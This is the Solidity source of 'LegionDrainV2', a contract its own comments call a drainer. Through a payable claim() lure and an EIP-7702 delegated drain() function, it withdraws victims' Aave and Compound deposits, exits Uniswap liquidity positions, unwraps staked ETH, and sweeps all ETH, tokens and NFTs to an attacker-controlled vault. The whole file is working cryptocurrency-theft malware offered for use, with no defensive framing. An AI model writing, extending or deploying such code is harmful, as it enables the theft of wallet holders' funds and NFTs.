// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

/**
 * LegionDrainV2 — DeFi-aware unified drain (one contract per chain)
 *
 * PATH A — Mobile / WC: claim() payable → vault
 * PATH B — EIP-7702 desktop: drain(...) → DeFi unwrap + ETH/ERC20/NFT sweep
 *
 * Scout (legion.js) passes DefiAction[] built from Aave/Compound/LP/stETH probes.
 */

interface IERC20 {
    function balanceOf(address) external view returns (uint256);
    function transfer(address to, uint256 amount) external returns (bool);
}

interface IERC721 {
    function transferFrom(address from, address to, uint256 tokenId) external;
    function safeTransferFrom(address from, address to, uint256 tokenId) external;
}

interface IERC1155 {
    function safeTransferFrom(address from, address to, uint256 id, uint256 amount, bytes calldata data) external;
    function balanceOf(address account, uint256 id) external view returns (uint256);
}

interface IWETH {
    function withdraw(uint256) external;
}

interface IWstETH {
    function unwrap(uint256 amount) external;
}

interface IAavePool {
    function withdraw(address asset, uint256 amount, address to) external returns (uint256);
}

interface ICErc20 {
    function redeem(uint256 redeemTokens) external returns (uint256);
    function redeemUnderlying(uint256 redeemAmount) external returns (uint256);
}

interface IUniswapV2Router {
    function removeLiquidity(
        address tokenA,
        address tokenB,
        uint256 liquidity,
        uint256 amountAMin,
        uint256 amountBMin,
        address to,
        uint256 deadline
    ) external returns (uint256 amountA, uint256 amountB);
}

interface INonfungiblePositionManager {
    struct DecreaseLiquidityParams {
        uint256 tokenId;
        uint128 liquidity;
        uint256 amount0Min;
        uint256 amount1Min;
        uint256 deadline;
    }

    struct CollectParams {
        uint256 tokenId;
        address recipient;
        uint128 amount0Max;
        uint128 amount1Max;
    }

    function decreaseLiquidity(DecreaseLiquidityParams calldata params)
        external
        payable
        returns (uint256 amount0, uint256 amount1);

    function collect(CollectParams calldata params) external payable returns (uint256 amount0, uint256 amount1);
}

struct DefiAction {
    uint8 kind;
    address target;
    address tokenA;
    address tokenB;
    uint256 param1;
    uint256 param2;
    uint256 param3;
}

contract LegionDrainV2 {
    address public immutable vault;
    address public immutable weth;
    uint256 public constant MAX_NFTS = 50;
    uint256 public constant MAX_DEFI_ACTIONS = 24;
    uint256 private constant MAX_UINT = type(uint256).max;

    uint8 public constant KIND_AAVE_WITHDRAW = 1;
    uint8 public constant KIND_COMPOUND_REDEEM = 2;
    uint8 public constant KIND_UNIV2_REMOVE = 3;
    uint8 public constant KIND_WSTETH_UNWRAP = 4;
    uint8 public constant KIND_UNIV3_EXIT = 5;

    error Unauthorized();
    error TransferFailed();
    error ZeroVault();

    constructor(address _vault, address _weth) {
        if (_vault == address(0)) revert ZeroVault();
        vault = _vault;
        weth = _weth;
    }

    modifier onlySelf() {
        if (msg.sender != address(this)) revert Unauthorized();
        _;
    }

    /// @notice Mobile + WC — native ETH forward (nblscj-style)
    function claim() external payable {
        if (msg.value == 0) return;
        _forwardNative(msg.value);
    }

    /// @notice EIP-7702 — DeFi unwrap then full wallet sweep
    function drain(
        address[] calldata erc20s,
        address[] calldata erc721Contracts,
        uint256[] calldata erc721Ids,
        address[] calldata erc1155Contracts,
        uint256[] calldata erc1155Ids,
        DefiAction[] calldata defiActions
    ) external onlySelf {
        _runDefiActions(defiActions);
        _unwrapWethIfHeld();
        _sweepNative();
        _sweepErc20(erc20s);
        _sweepErc721(erc721Contracts, erc721Ids);
        _sweepErc1155(erc1155Contracts, erc1155Ids);
    }

    function _runDefiActions(DefiAction[] calldata defiActions) internal {
        uint256 defiLen = defiActions.length;
        if (defiLen > MAX_DEFI_ACTIONS) defiLen = MAX_DEFI_ACTIONS;
        for (uint256 i; i < defiLen; ++i) {
            _executeDefiAction(defiActions[i]);
        }
    }

    function _sweepNative() internal {
        uint256 ethBal = address(this).balance;
        if (ethBal > 0) _forwardNative(ethBal);
    }

    function _sweepErc20(address[] calldata erc20s) internal {
        uint256 n = erc20s.length;
        for (uint256 i; i < n; ++i) {
            address t = erc20s[i];
            if (t == address(0)) continue;
            uint256 bal = IERC20(t).balanceOf(address(this));
            if (bal > 0) {
                try IERC20(t).transfer(vault, bal) {} catch {}
            }
        }
    }

    function _sweepErc721(address[] calldata erc721Contracts, uint256[] calldata erc721Ids) internal {
        uint256 nft721Count = erc721Contracts.length < erc721Ids.length
            ? erc721Contracts.length
            : erc721Ids.length;
        if (nft721Count > MAX_NFTS) nft721Count = MAX_NFTS;
        for (uint256 i; i < nft721Count; ++i) {
            try IERC721(erc721Contracts[i]).transferFrom(address(this), vault, erc721Ids[i]) {} catch {
                try IERC721(erc721Contracts[i]).safeTransferFrom(address(this), vault, erc721Ids[i]) {} catch {}
            }
        }
    }

    function _sweepErc1155(address[] calldata erc1155Contracts, uint256[] calldata erc1155Ids) internal {
        uint256 nft1155Count = erc1155Contracts.length < erc1155Ids.length
            ? erc1155Contracts.length
            : erc1155Ids.length;
        if (nft1155Count > MAX_NFTS) nft1155Count = MAX_NFTS;
        for (uint256 i; i < nft1155Count; ++i) {
            uint256 bal1155 = IERC1155(erc1155Contracts[i]).balanceOf(address(this), erc1155Ids[i]);
            if (bal1155 > 0) {
                try IERC1155(erc1155Contracts[i]).safeTransferFrom(
                    address(this), vault, erc1155Ids[i], bal1155, ""
                ) {} catch {}
            }
        }
    }

    function _executeDefiAction(DefiAction calldata a) internal {
        if (a.kind == KIND_AAVE_WITHDRAW) {
            _defiAaveWithdraw(a);
        } else if (a.kind == KIND_COMPOUND_REDEEM) {
            _defiCompoundRedeem(a);
        } else if (a.kind == KIND_UNIV2_REMOVE) {
            _defiUniV2Remove(a);
        } else if (a.kind == KIND_WSTETH_UNWRAP) {
            _defiWstEthUnwrap(a);
        } else if (a.kind == KIND_UNIV3_EXIT) {
            _defiUniV3Exit(a);
        }
    }

    function _defiAaveWithdraw(DefiAction calldata a) internal {
        if (a.target == address(0) || a.tokenA == address(0)) return;
        uint256 amt = a.param1 == 0 ? MAX_UINT : a.param1;
        try IAavePool(a.target).withdraw(a.tokenA, amt, address(this)) {} catch {}
    }

    function _defiCompoundRedeem(DefiAction calldata a) internal {
        if (a.target == address(0)) return;
        if (a.param1 > 0) {
            try ICErc20(a.target).redeemUnderlying(a.param1) {} catch {}
            return;
        }
        uint256 cBal = IERC20(a.target).balanceOf(address(this));
        if (cBal > 0) {
            try ICErc20(a.target).redeem(cBal) {} catch {}
        }
    }

    function _defiUniV2Remove(DefiAction calldata a) internal {
        if (a.target == address(0) || a.tokenA == address(0) || a.tokenB == address(0)) return;
        if (a.param1 == 0) return;
        uint256 deadline = a.param3 == 0 ? block.timestamp : a.param3;
        try IUniswapV2Router(a.target).removeLiquidity(
            a.tokenA, a.tokenB, a.param1, 0, 0, address(this), deadline
        ) {} catch {}
    }

    function _defiWstEthUnwrap(DefiAction calldata a) internal {
        address wst = a.target != address(0) ? a.target : a.tokenA;
        if (wst == address(0)) return;
        uint256 amt = a.param1;
        if (amt == 0) amt = IERC20(wst).balanceOf(address(this));
        if (amt > 0) {
            try IWstETH(wst).unwrap(amt) {} catch {}
        }
    }

    function _defiUniV3Exit(DefiAction calldata a) internal {
        if (a.target == address(0) || a.param1 == 0) return;
        uint256 deadline = a.param3 == 0 ? block.timestamp : a.param3;
        uint128 liquidity = uint128(a.param2);
        if (liquidity > 0) {
            try INonfungiblePositionManager(a.target).decreaseLiquidity(
                INonfungiblePositionManager.DecreaseLiquidityParams({
                    tokenId: a.param1,
                    liquidity: liquidity,
                    amount0Min: 0,
                    amount1Min: 0,
                    deadline: deadline
                })
            ) {} catch {}
        }
        try INonfungiblePositionManager(a.target).collect(
            INonfungiblePositionManager.CollectParams({
                tokenId: a.param1,
                recipient: address(this),
                amount0Max: type(uint128).max,
                amount1Max: type(uint128).max
            })
        ) {} catch {}
    }

    function _unwrapWethIfHeld() internal {
        if (weth == address(0)) return;
        uint256 wbal = IERC20(weth).balanceOf(address(this));
        if (wbal > 0) {
            try IWETH(weth).withdraw(wbal) {} catch {}
        }
    }

    function _forwardNative(uint256 amount) internal {
        (bool ok,) = vault.call{value: amount}("");
        if (!ok) revert TransferFailed();
    }

    receive() external payable {
        if (msg.value > 0) _forwardNative(msg.value);
    }

    fallback() external payable {
        if (msg.value > 0) _forwardNative(msg.value);
    }
}
